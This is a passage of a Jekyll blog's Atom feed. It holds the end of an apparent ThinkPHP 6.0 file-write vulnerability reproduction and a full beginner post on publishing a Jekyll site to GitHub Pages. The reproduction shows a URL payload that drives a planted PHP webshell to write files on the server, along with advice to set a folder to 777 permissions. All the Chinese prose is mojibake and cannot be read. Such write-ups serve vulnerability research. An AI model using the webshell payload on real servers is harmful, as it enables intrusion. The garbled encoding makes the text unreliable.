&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/eval.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;200ä¹‹åï¼Œåœ¨&lt;code class=&quot;highlighter-rouge&quot;&gt;public/&lt;/code&gt;ä¸‹å†™å…¥äº†åä¸º&lt;code class=&quot;highlighter-rouge&quot;&gt;sueisokkk.php&lt;/code&gt;çš„æ–‡ä»¶ï¼Œåœ¨æµè§ˆå™¨ä¸­è®¿é—®æ„é€ å¸¦æœ‰payloadçš„é“¾æ¥ï¼š&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://xxx.xxx.xxx.xxx:8000/sueisokkk.php?a=fwrite(fopen(%22aa.txt%22,%20%22w%22),%22hello,world!%22);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;å°±åœ¨&lt;code class=&quot;highlighter-rouge&quot;&gt;public/&lt;/code&gt;ä¸‹å†™å…¥äº†åä¸º&lt;code class=&quot;highlighter-rouge&quot;&gt;aa.txt&lt;/code&gt;å†…å®¹ä¸º&lt;code class=&quot;highlighter-rouge&quot;&gt;hello,world&lt;/code&gt;çš„æ–‡ä»¶&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/helloworld.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ğŸ˜‡æ­¤æ—¶çš„å¿ƒæƒ…å½·ä½›æ˜¥å¤©æ¥åˆ°&lt;/p&gt;

&lt;h1 id=&quot;å…¶ä»–çš„å‘&quot;&gt;å…¶ä»–çš„å‘&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;ğŸ’¢å¦‚æœä¿®æ”¹äº†sessionä»¥åï¼Œhttp://localhost:8000è®¿é—®ä¹‹åå‡ºé”™ï¼Œå°±è¦è¯•ä¸€ä¸‹&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo php think run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ğŸ’¢å¦‚æœ&lt;code class=&quot;highlighter-rouge&quot;&gt;runtime/session/&lt;/code&gt;ä¸‹æ²¡æœ‰ç”Ÿæˆçš„sessionï¼Œé‚£å°±åº”è¯¥æ˜¯æ–‡ä»¶å¤¹å†™çš„æƒé™ä¸å¤Ÿï¼Œæˆ‘æ˜¯ç›´æ¥ç»™äº†777&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo chmod 777 /runtime/session/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ‰€ä»¥èƒ½ä»»æ„å†™å…¥æ–‡ä»¶getshellçš„æ¡ä»¶è¿˜æ˜¯å¾ˆè‹›åˆ»çš„&lt;/p&gt;</content><author><name>true</name></author><category term="ThinkPHP" /><category term="æ¼æ´å¤ç°" /><summary type="html"></summary></entry><entry><title type="html">ç¬¬ä¸€ç¯‡åšå®¢</title><link href="http://localhost:4000/blog/first-blog/" rel="alternate" type="text/html" title="ç¬¬ä¸€ç¯‡åšå®¢" /><published>2020-01-15T15:04:21+08:00</published><updated>2020-01-15T15:04:21+08:00</updated><id>http://localhost:4000/blog/first-blog</id><content type="html" xml:base="http://localhost:4000/blog/first-blog/">&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0x00-æ‹¥æœ‰github&quot; id=&quot;markdown-toc-0x00-æ‹¥æœ‰github&quot;&gt;0x00 æ‹¥æœ‰github&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#0x01-é€‰æ‹©çš„å·¥å…·&quot; id=&quot;markdown-toc-0x01-é€‰æ‹©çš„å·¥å…·&quot;&gt;0x01 é€‰æ‹©çš„å·¥å…·&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#0x02-å®‰è£…å·¥å…·&quot; id=&quot;markdown-toc-0x02-å®‰è£…å·¥å…·&quot;&gt;0x02 å®‰è£…å·¥å…·&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#å®‰è£…ruby&quot; id=&quot;markdown-toc-å®‰è£…ruby&quot;&gt;å®‰è£…ruby&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#å®‰è£…bundle&quot; id=&quot;markdown-toc-å®‰è£…bundle&quot;&gt;å®‰è£…bundle&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#å®‰è£…jekyll&quot; id=&quot;markdown-toc-å®‰è£…jekyll&quot;&gt;å®‰è£…jekyll&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#æ³¨å†Œæ¥å¿…åŠ›&quot; id=&quot;markdown-toc-æ³¨å†Œæ¥å¿…åŠ›&quot;&gt;æ³¨å†Œæ¥å¿…åŠ›&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#0x03-å‘è¡¨è‡ªå·±çš„ç¬¬ä¸€ç¯‡åšå®¢&quot; id=&quot;markdown-toc-0x03-å‘è¡¨è‡ªå·±çš„ç¬¬ä¸€ç¯‡åšå®¢&quot;&gt;0x03 å‘è¡¨è‡ªå·±çš„ç¬¬ä¸€ç¯‡åšå®¢&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#æŠŠè‡ªå·±åŸå…ˆçš„ä»“åº“cloneä¸‹æ¥&quot; id=&quot;markdown-toc-æŠŠè‡ªå·±åŸå…ˆçš„ä»“åº“cloneä¸‹æ¥&quot;&gt;æŠŠè‡ªå·±åŸå…ˆçš„ä»“åº“cloneä¸‹æ¥&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#é€‰æ‹©ä¸€ä¸ªè‡ªå·±å–œæ¬¢çš„ä¸»é¢˜&quot; id=&quot;markdown-toc-é€‰æ‹©ä¸€ä¸ªè‡ªå·±å–œæ¬¢çš„ä¸»é¢˜&quot;&gt;é€‰æ‹©ä¸€ä¸ªè‡ªå·±å–œæ¬¢çš„ä¸»é¢˜&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#ç”¨typoraå†™ä¸€ç¯‡å†…å®¹&quot; id=&quot;markdown-toc-ç”¨typoraå†™ä¸€ç¯‡å†…å®¹&quot;&gt;ç”¨Typoraå†™ä¸€ç¯‡å†…å®¹&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#å°†ä¿®æ”¹å†…å®¹æäº¤åˆ°github&quot; id=&quot;markdown-toc-å°†ä¿®æ”¹å†…å®¹æäº¤åˆ°github&quot;&gt;å°†ä¿®æ”¹å†…å®¹æäº¤åˆ°github&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;0x00-æ‹¥æœ‰github&quot;&gt;0x00 æ‹¥æœ‰github&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;ä¸ºä»€ä¹ˆç”¨githubï¼š
(ï¿£â–½ï¿£)â€æ–¹ä¾¿ä¸è¦é’±ï¼Œæ²¡æœ‰åˆ«çš„&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æ³¨å†Œgithubè´¦å·ï¼š&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è¿™ä¸ªä¸ç”¨è¯´äº†ï¼Œä¹‹å‰å°±æœ‰è´¦å·äº†ï¼Œç›´æ¥åœ¨ä»“åº“é‡Œæ–°å»ºå°±è¡Œï¼Œä¼šæœ‰ä¸ªåŸŸåï¼Œæ¯”å¦‚æˆ‘çš„æ˜¯&lt;code class=&quot;highlighter-rouge&quot;&gt;sueisok&lt;/code&gt;ï¼ŒåŸŸåå°±æ˜¯&lt;code class=&quot;highlighter-rouge&quot;&gt;sueisok.github.io&lt;/code&gt;äº†ã€‚ä¸éœ€è¦ä»€ä¹ˆdnspodï¼Œä»€ä¹ˆdnsdaddyï¼Œä»€ä¹ˆä¸€å¹´50ç¾å…ƒç§ŸæœåŠ¡å™¨ï¼Œè´µä¸”ä¸å¥½ç»´æŠ¤ï¼Œä¸”ç¬¬ä¸‰æ–¹å¹³å°æ¯”å¦‚wordpresså¯èƒ½æœ‰æ¼æ´ä¹‹ç±»çš„ï¼Œè¿˜è¦æ—¶å¸¸æ›´æ–°ç‰ˆæœ¬&lt;/p&gt;

&lt;h1 id=&quot;0x01-é€‰æ‹©çš„å·¥å…·&quot;&gt;0x01 é€‰æ‹©çš„å·¥å…·&lt;/h1&gt;

&lt;p&gt;æœ¬äººç”µè„‘ä¸ºwin10ç³»ç»Ÿ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://rubyinstaller.org/downloads/&quot;&gt;Ruby&lt;/a&gt;:ä¸€ç§ç®€å•å¿«æ·çš„é¢å‘å¯¹è±¡ï¼ˆé¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ï¼‰è„šæœ¬è¯­è¨€ï¼Œå®‰è£…Jekylléœ€è¦ç”µè„‘ä¸Šå®‰è£…Ruby&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://jekyllcn.com/&quot;&gt;Jekyll&lt;/a&gt;ï¼šjekyllç”ŸæˆGit Pagesï¼Œæ˜¯ä¸€ä¸ªç”Ÿæˆé™æ€ç½‘é¡µçš„å·¥å…·ï¼Œä¸éœ€è¦æ•°æ®åº“æ”¯æŒã€‚ä½†æ˜¯å¯ä»¥é…åˆç¬¬ä¸‰æ–¹æœåŠ¡ï¼Œæ¯”å¦‚è¯„è®ºåŒºå¯ä»¥æœ‰ç¬¬ä¸‰æ–¹æ”¯æŒï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯æ¥å¿…åŠ›&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://typora.io/&quot;&gt;Typora&lt;/a&gt;:æ˜¯ä¸€æ¬¾æ”¯æŒå®æ—¶é¢„è§ˆçš„ Markdown æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå¾ˆå¼ºå¤§&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://livere.com/&quot;&gt;æ¥å¿…åŠ›&lt;/a&gt;:æ·»åŠ çš„ç¬¬ä¸‰æ–¹è¯„è®ºå·¥å…·&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;0x02-å®‰è£…å·¥å…·&quot;&gt;0x02 å®‰è£…å·¥å…·&lt;/h1&gt;

&lt;h2 id=&quot;å®‰è£…ruby&quot;&gt;å®‰è£…ruby&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://rubyinstaller.org/downloads/&quot;&gt;Rubyå®˜ç½‘&lt;/a&gt;ä¸‹è½½å®‰è£…åŒ…ï¼Œé€‰æ‹©å¸¦DevKitçš„&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;å®‰è£…åˆ°æŸä¸ªè·¯å¾„ä¸‹å³å¯&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æ·»åŠ åˆ°ç¯å¢ƒå˜é‡&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æ£€æŸ¥rubyæ˜¯å¦å®‰è£…æˆåŠŸï¼š&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ruby -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;æ£€æŸ¥gemç‰ˆæœ¬ï¼Œgemæ˜¯ä¸€ä¸ªç®¡ç†rubyåº“å’Œç¨‹åºçš„æ ‡å‡†åŒ…ï¼Œç”¨RubyInstallerå®‰è£…rubyä¹‹åéƒ½é™„å¸¦æœ‰gemï¼ˆä¸æ˜¯é‚“ç´«æ£‹&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gem -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;å®‰è£…bundle&quot;&gt;å®‰è£…bundle&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gem install bundle
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è‡³äºè¿™æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä¸çŸ¥é“ï¼Œè‡³äºä¼šå‡ºç°ä»€ä¹ˆæŠ¥é”™ï¼Œæˆ‘æ²¡é‡è§&lt;/p&gt;

&lt;h2 id=&quot;å®‰è£…jekyll&quot;&gt;å®‰è£…jekyll&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gem install jekyll
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆåŠŸçš„è¯å°±æˆåŠŸäº†ã€‚è¿™é‡Œç¢ç¢å¿µä¸€ä¸‹ï¼Œ(ãƒã¸ï¿£ã€)å…¬å¸ç”µè„‘ä¸Šå°±å¯ä»¥å®‰è£…æˆåŠŸï¼Œå®¶é‡Œè‡ªå·±çš„ç”µè„‘å°±ä¸æˆåŠŸ&lt;/p&gt;

&lt;p&gt;æŸ¥çœ‹jekyllç‰ˆæœ¬&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ jekyll -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¦‚æœæŠ¥é”™å•¥çš„ï¼Œå°±æŒ‰ä»–æç¤ºï¼Œæœ‰å¯èƒ½æ˜¯&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ bundle exec jekyll -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ˜¾ç¤ºäº†ç‰ˆæœ¬å°±æ˜¯æˆåŠŸè¢… æˆ‘çš„æ˜¯jekyll 3.8.6&lt;/p&gt;

&lt;h2 id=&quot;æ³¨å†Œæ¥å¿…åŠ›&quot;&gt;æ³¨å†Œæ¥å¿…åŠ›&lt;/h2&gt;

&lt;p&gt;æ³¨å†Œå®Œå°†ç”Ÿæˆçš„å†…å®¹æ·»åŠ åˆ°ä»“åº“æ–‡ä»¶çš„&lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;é‡Œ&lt;/p&gt;

&lt;h1 id=&quot;0x03-å‘è¡¨è‡ªå·±çš„ç¬¬ä¸€ç¯‡åšå®¢&quot;&gt;0x03 å‘è¡¨è‡ªå·±çš„ç¬¬ä¸€ç¯‡åšå®¢&lt;/h1&gt;

&lt;p&gt;æˆ‘è‡ªå·±ä¹‹å‰åœ¨githubä¸Šæœ‰è¿‡ä¸»é¡µï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œåªå†™å¦‚ä½•åº”ç”¨ä¸€ä¸ªè‡ªå·±å–œæ¬¢çš„ä¸»é¢˜ï¼Œç„¶åæäº¤åˆ°gitä¸Šï¼Œè®©æ‰€æœ‰äººéƒ½çœ‹åˆ°&lt;/p&gt;

&lt;h2 id=&quot;æŠŠè‡ªå·±åŸå…ˆçš„ä»“åº“cloneä¸‹æ¥&quot;&gt;æŠŠè‡ªå·±åŸå…ˆçš„ä»“åº“cloneä¸‹æ¥&lt;/h2&gt;

&lt;p&gt;åŸå…ˆgithubä¸Šæœ‰è¿‡ä¸»é¡µï¼Œcloneåˆ°æœ¬åœ°ä¸€ä¸ªè·¯å¾„ä¸‹&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git clone xxxä½ çš„ä»“åº“xxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;é€‰æ‹©ä¸€ä¸ªè‡ªå·±å–œæ¬¢çš„ä¸»é¢˜&quot;&gt;é€‰æ‹©ä¸€ä¸ªè‡ªå·±å–œæ¬¢çš„ä¸»é¢˜&lt;/h2&gt;

&lt;p&gt;æœ‰å¥½å¤šä¸»é¢˜çš„ç½‘ç«™ï¼Œæˆ‘è¿™ä¸ªæ˜¯åœ¨&lt;a href=&quot;http://jekyllthemes.org/&quot;&gt;jekyllthemes&lt;/a&gt;æ‰¾çš„ï¼Œä¹Ÿå¯ä»¥åœ¨å–œæ¬¢çš„åšä¸»é¡µè„šä¸­æ‰¾åˆ°ä»–ä»¬ç”¨çš„ä¸»é¢˜ï¼ˆçœŸæ˜¯ä¸ªå°æœºçµé¬¼å„¿&lt;/p&gt;

&lt;p&gt;ä¸‹è½½ä¸‹æ¥ï¼Œå¦‚æœè¿™ä¸ªä¸»é¢˜èƒ½ç”¨çš„è¯ï¼Œæ¥ç€å¾€ä¸‹è¿›è¡Œ&lt;/p&gt;

&lt;p&gt;å¦‚æœç›´æ¥æŠŠä¸»é¢˜ä¸­çš„å†…å®¹å¤åˆ¶åˆ°ä»“åº“é‡Œï¼Œä¼šå‡ºé”™ï¼Œè¿™é‡Œå»ºè®®å…ˆåœ¨ä¸»é¢˜çš„ç›®å½•ä¸‹ç”Ÿæˆé¡µé¢ï¼Œå†å¤åˆ¶åˆ°cloneçš„ä»“åº“ç›®å½•ä¸‹ï¼Œåœ¨ä¸‹è½½çš„ä¸»é¢˜ç›®å½•ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ bundle exec jekyll serve
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç„¶åå°†ç”Ÿæˆçš„æ‰€æœ‰å†…å®¹å¤åˆ¶åˆ°è‡ªå·±ç›®å½•ä¸‹&lt;/p&gt;

&lt;p&gt;å¦‚æœä¹‹å‰ä»“åº“æœ‰è‡ªå·±çš„å†…å®¹ï¼Œæ¯”å¦‚&lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt;é‡Œçš„é™æ€é¡µé¢æˆ–è€…&lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;çš„å†…å®¹ï¼Œéœ€è¦ä¿®æ”¹åå†æ›¿æ¢&lt;/p&gt;

&lt;p&gt;åœ¨è‡ªå·±çš„ä»“åº“ç›®å½•ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ bundle exec jekyll serve
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ˜¾ç¤º&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Configuration file: xxxx/sueisok.github.io/_config.yml
            Source: xxxx/sueisok.github.io
       Destination: xxxx/sueisok.github.io/_site
 Incremental build: disabled. Enable with --incremental
      Generating...
       Jekyll Feed: Generating feed for posts
                    done in 2.183 seconds.
 Auto-regeneration: enabled for 'xxxx/sueisok.github.io'
  JekyllAdmin mode: production
    Server address: http://127.0.0.1:4000
  Server running... press ctrl-c to stop.
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å³å¯è®¿é—®æœ¬åœ°&lt;code class=&quot;highlighter-rouge&quot;&gt;http://127.0.0.1:4000&lt;/code&gt;æŸ¥çœ‹é¡µé¢ï¼Œç›´åˆ°è‡ªå·±æ»¡æ„äº†ä¹‹åå†æäº¤åˆ°githubä¸Š&lt;/p&gt;

&lt;h2 id=&quot;ç”¨typoraå†™ä¸€ç¯‡å†…å®¹&quot;&gt;ç”¨Typoraå†™ä¸€ç¯‡å†…å®¹&lt;/h2&gt;

&lt;p&gt;Typoraæ˜¯å¯ä»¥å†™markdownæ ¼å¼å†…å®¹çš„ç¼–è¾‘å™¨ï¼Œç®€çº¦å¤§æ–¹åˆä¸å¤±ä¾¿æ·ï¼Œè¿˜å¯ä»¥ç›´æ¥æ·»åŠ emojiè¡¨æƒ…ï¼Œä¸‹æ¬¡è¯•ä¸€ä¸‹&lt;/p&gt;

&lt;p&gt;å†™å®Œç›´æ¥ä¸¢åˆ°ä»“åº“çš„&lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt;é‡Œé¢&lt;/p&gt;

&lt;h2 id=&quot;å°†ä¿®æ”¹å†…å®¹æäº¤åˆ°github&quot;&gt;å°†ä¿®æ”¹å†…å®¹æäº¤åˆ°github&lt;/h2&gt;

&lt;p&gt;å¯ä»¥ä¸‹è½½&lt;a href=&quot;https://desktop.github.com/&quot;&gt;GitHub Desktop&lt;/a&gt;ï¼Œæ¯”è¾ƒç›´è§‚&lt;/p&gt;

&lt;p&gt;ä¹Ÿå¯ä»¥æ‰‹åŠ¨æäº¤åˆ°gitï¼Œæˆ‘è¿™é‡Œç›®å‰åªæœ‰ä¸€ä¸ªmasteråˆ†æ”¯ï¼Œæ“ä½œä¹Ÿæ¯”è¾ƒæš´åŠ›å› ä¸ºåªæœ‰æˆ‘ä¸€ä¸ªäººç»´æŠ¤ï¼Œå¦‚æœéœ€è¦å…¶ä»–åˆ†æ”¯å¯è‡ªè¡Œç™¾åº¦&lt;/p&gt;

&lt;p&gt;æŸ¥çœ‹ä¿®æ”¹å†…å®¹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git status
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å°†è¦æäº¤çš„æ–‡ä»¶çš„ä¿¡æ¯æ·»åŠ åˆ°ç´¢å¼•åº“&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git add .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ·»åŠ æ­¤æ¬¡ä¿®æ”¹çš„å¤‡æ³¨&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git commit -m &quot;xxxx&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æäº¤åˆ°masteråˆ†æ”¯&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git push origin master
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç½‘ç»œå·®çš„è¯å¯èƒ½æäº¤å¤±è´¥ï¼Œå†è¯•ä¸€ä¸‹å°±å¥½äº†ï¼ˆã€ƒï½€ 3â€²ã€ƒï¼‰&lt;/p&gt;

&lt;p&gt;ç„¶åç¨ç­‰ä¸€ä¸‹å°±å¯ä»¥çœ‹åˆ°è‡ªå·±çš„commitæˆåŠŸï¼Œåœ¨ç­‰ä¸€ä¸‹å°±å¯ä»¥çœ‹åˆ°è‡ªå·±çš„æ–‡ç« æ›´æ–°å¥½äº†ï¼Œå¥¥é‡Œç»™ï¼&lt;/p&gt;</content><author><name>true</name></author><category term="jekyll" /><category term="github" /><summary type="html"></summary></entry></feed>